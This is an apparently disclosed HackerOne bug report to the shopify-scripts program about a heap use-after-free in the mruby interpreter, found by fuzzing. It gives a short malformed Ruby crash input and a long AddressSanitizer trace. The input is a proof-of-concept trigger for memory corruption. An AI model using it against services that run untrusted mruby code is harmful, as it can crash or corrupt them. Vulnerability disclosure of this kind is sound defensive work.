# mruby heap use-after-free 

## Report Details
- **Report ID**: 206109
- **URL**: https://hackerone.com/reports/206109
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-02-13T19:08:25.703Z
- **Disclosed**: 2017-04-27T21:18:04.699Z

## Reporter
- **Username**: mg36
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
By doing some fuzzing against mruby, I spot this vulnerability,
The source code should be compiled with AddressSanitizer,

Here is the vulnerable code : 
```
class NoMethodError < NameError
  def initialize(message=nil, name=nil, args=nil)
    @args = ar   super message,&name
  end
end

class StopIteration < r :result
end
```

```
./mruby_asan vuln1.rb
=================================================================
==11798==ERROR: AddressSanitizer: heap-use-after-free on address 0x61e00000fa78 at pc 0x000000452d1a bp 0x7ffc9e531d40 sp 0x7ffc9e531d30
WRITE of size 8 at 0x61e00000fa78 thread T0
    #0 0x452d19 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1386
    #1 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #2 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #3 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #4 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #5 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #6 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #7 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #8 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #9 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493
    #10 0x4281a4 in mrb_bob_missing /home/simo/test/mruby_asan/src/class.c:1538
    #11 0x450bb8 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1211
    #12 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #13 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #14 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #15 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #16 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #17 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #18 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #19 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #20 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493
    #21 0x4281a4 in mrb_bob_missing /home/simo/test/mruby_asan/src/class.c:1538
    #22 0x450bb8 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1211
    #23 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #24 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #25 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #26 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #27 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #28 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #29 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #30 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #31 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493
    #32 0x4281a4 in mrb_bob_missing /home/simo/test/mruby_asan/src/class.c:1538
    #33 0x450bb8 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1211
    #34 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #35 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #36 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #37 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #38 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #39 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #40 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #41 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #42 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493
    #43 0x4281a4 in mrb_bob_missing /home/simo/test/mruby_asan/src/class.c:1538
    #44 0x450bb8 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1211
    #45 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #46 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #47 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #48 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #49 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #50 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #51 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #52 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #53 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493
    #54 0x4281a4 in mrb_bob_missing /home/simo/test/mruby_asan/src/class.c:1538
    #55 0x450bb8 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1211
    #56 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #57 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #58 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #59 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #60 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #61 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #62 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #63 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #64 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493
    #65 0x4281a4 in mrb_bob_missing /home/simo/test/mruby_asan/src/class.c:1538
    #66 0x450bb8 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1211
    #67 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #68 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #69 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #70 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #71 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #72 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #73 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #74 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #75 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493
    #76 0x4281a4 in mrb_bob_missing /home/simo/test/mruby_asan/src/class.c:1538
    #77 0x450bb8 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1211
    #78 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #79 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #80 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #81 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #82 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #83 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #84 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #85 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #86 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493
    #87 0x4281a4 in mrb_bob_missing /home/simo/test/mruby_asan/src/class.c:1538
    #88 0x450bb8 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1211
    #89 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #90 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #91 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #92 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #93 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #94 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #95 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #96 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #97 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493
    #98 0x4281a4 in mrb_bob_missing /home/simo/test/mruby_asan/src/class.c:1538
    #99 0x450bb8 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1211
    #100 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #101 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #102 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #103 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #104 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #105 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #106 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #107 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #108 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493
    #109 0x4281a4 in mrb_bob_missing /home/simo/test/mruby_asan/src/class.c:1538
    #110 0x450bb8 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1211
    #111 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #112 0x461af3 in mrb_top_run /home/simo/test/mruby_asan/src/vm.c:2547
    #113 0x4abff7 in mrb_load_exec /home/simo/test/mruby_asan/mrbgems/mruby-compiler/core/parse.y:5755
    #114 0x4ac158 in mrb_load_file_cxt /home/simo/test/mruby_asan/mrbgems/mruby-compiler/core/parse.y:5764
    #115 0x403757 in main /home/simo/test/mruby_asan/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232
    #116 0x7fc24bd0582f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #117 0x4023c8 in _start (/home/simo/test/mruby/bin/mruby_asan+0x4023c8)

0x61e00000fa78 is located 2552 bytes inside of 2560-byte region [0x61e00000f080,0x61e00000fa80)
freed by thread T0 here:
    #0 0x7fc24c44f961 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98961)
    #1 0x487d4f in mrb_default_allocf /home/simo/test/mruby_asan/src/state.c:60
    #2 0x40ac63 in mrb_realloc_simple /home/simo/test/mruby_asan/src/gc.c:201
    #3 0x40ad62 in mrb_realloc /home/simo/test/mruby_asan/src/gc.c:215
    #4 0x4468b1 in cipush /home/simo/test/mruby_asan/src/vm.c:231
    #5 0x447fdf in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:383
    #6 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #7 0x4435eb in convert_type /home/simo/test/mruby_asan/src/object.c:320
    #8 0x4438d8 in mrb_convert_type /home/simo/test/mruby_asan/src/object.c:342
    #9 0x452cdc in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1383
    #10 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #11 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #12 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #13 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #14 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #15 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #16 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #17 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #18 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493
    #19 0x4281a4 in mrb_bob_missing /home/simo/test/mruby_asan/src/class.c:1538
    #20 0x450bb8 in mrb_vm_exec /home/simo/test/mruby_asan/src/vm.c:1211
    #21 0x44bb78 in mrb_vm_run /home/simo/test/mruby_asan/src/vm.c:801
    #22 0x461961 in mrb_run /home/simo/test/mruby_asan/src/vm.c:2536
    #23 0x448bf4 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:437
    #24 0x4273ae in mrb_instance_new /home/simo/test/mruby_asan/src/class.c:1401
    #25 0x448a91 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:430
    #26 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #27 0x44776a in mrb_funcall /home/simo/test/mruby_asan/src/vm.c:328
    #28 0x4b4f08 in mrb_no_method_error /home/simo/test/mruby_asan/src/error.c:526
    #29 0x428053 in mrb_method_missing /home/simo/test/mruby_asan/src/class.c:1493

previously allocated by thread T0 here:
    #0 0x7fc24c44f961 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98961)
    #1 0x487d4f in mrb_default_allocf /home/simo/test/mruby_asan/src/state.c:60
    #2 0x40ac63 in mrb_realloc_simple /home/simo/test/mruby_asan/src/gc.c:201
    #3 0x40ad62 in mrb_realloc /home/simo/test/mruby_asan/src/gc.c:215
    #4 0x40af49 in mrb_malloc /home/simo/test/mruby_asan/src/gc.c:236
    #5 0x40afca in mrb_calloc /home/simo/test/mruby_asan/src/gc.c:254
    #6 0x445b3d in stack_init /home/simo/test/mruby_asan/src/vm.c:97
    #7 0x447da2 in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:365
    #8 0x447adf in mrb_funcall_with_block /home/simo/test/mruby_asan/src/vm.c:343
    #9 0x448dbb in mrb_funcall_argv /home/simo/test/mruby_asan/src/vm.c:447
    #10 0x427584 in mrb_obj_new /home/simo/test/mruby_asan/src/class.c:1412
    #11 0x4b17bc in mrb_exc_new_str /home/simo/test/mruby_asan/src/error.c:32
    #12 0x4b51d1 in mrb_init_exception /home/simo/test/mruby_asan/src/error.c:550
    #13 0x4ba444 in mrb_init_core /home/simo/test/mruby_asan/src/init.c:41
    #14 0x487d04 in mrb_open_core /home/simo/test/mruby_asan/src/state.c:47
    #15 0x487ed5 in mrb_open_allocf /home/simo/test/mruby_asan/src/state.c:107
    #16 0x487ea8 in mrb_open /home/simo/test/mruby_asan/src/state.c:99
    #17 0x40323a in main /home/simo/test/mruby_asan/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:172
    #18 0x7fc24bd0582f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

SUMMARY: AddressSanitizer: heap-use-after-free /home/simo/test/mruby_asan/src/vm.c:1386 mrb_vm_exec
Shadow bytes around the buggy address:
  0x0c3c7fff9ef0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3c7fff9f00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3c7fff9f10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3c7fff9f20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3c7fff9f30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c3c7fff9f40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd[fd]
  0x0c3c7fff9f50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3c7fff9f60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3c7fff9f70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3c7fff9f80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3c7fff9f90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
==11798==ABORTING
```

Thanks

## Attachments
No attachments
